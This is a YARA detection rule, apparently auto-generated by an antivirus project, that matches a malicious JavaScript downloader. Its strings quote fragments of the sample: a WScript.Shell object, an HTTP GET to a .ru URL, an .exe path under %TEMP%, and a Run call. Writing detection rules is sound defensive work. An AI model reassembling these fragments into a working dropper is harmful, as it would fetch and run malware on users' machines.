rule sig_20160330_bfd8b882ef52b5ac03d3207009e58d86 {
  meta:
    description = "datamaliciousorder - file 20160330_bfd8b882ef52b5ac03d3207009e58d86.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "edc6c09b243dd6b3f99f3ddad6583e27d52b7f068ee304ec105e930cc43cc442"

  strings:
    $s1  = "function D(NF, Z1){T0 = T0 * 1; return NF - Z1;};" fullword ascii
    $s2  = "var S1 = function XP() {return WScript[G](\"WScript\"+\".Shell\");}(), NR = 11;" fullword ascii
    $s3  = "E[H](\"GET\", \"http://zakaz-sharikov.ru/x9dslp\", false);" fullword ascii
    $s4  = "if (E[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function IZ() {return S1[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"urnnoaVtW5AB3C.ex\" + \"e\";};" fullword ascii
    $s6  = "function DA(){return MA + \"\";};" fullword ascii
    $s7  = "function MP() {return ((NI == true) && (NI == TN)) ? 1 : T0;};" fullword ascii
    $s8  = "function T(XB){S1[\"Run\"](XB, T0, T0);};" fullword ascii
    $s9  = "function O(){return 22;};" fullword ascii
    $s10 = "}while (C);" fullword ascii
    $s11 = "function XI()" fullword ascii
    $s12 = "return D(V, PS);" fullword ascii
    $s13 = "function HG(Z0) {var EI = (1, 2, 3, 4, 5, Z0); return EI;};" fullword ascii
    $s14 = "function A(){return G;};" fullword ascii
    $s15 = "var S = new this[\"Date\"]();" fullword ascii
    $s16 = "var NI = false;" fullword ascii
    $s17 = "NI = true; " fullword ascii
    $s18 = "var S0 = false;" fullword ascii
    $s19 = "var TN = false;" fullword ascii
    $s20 = "TN = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}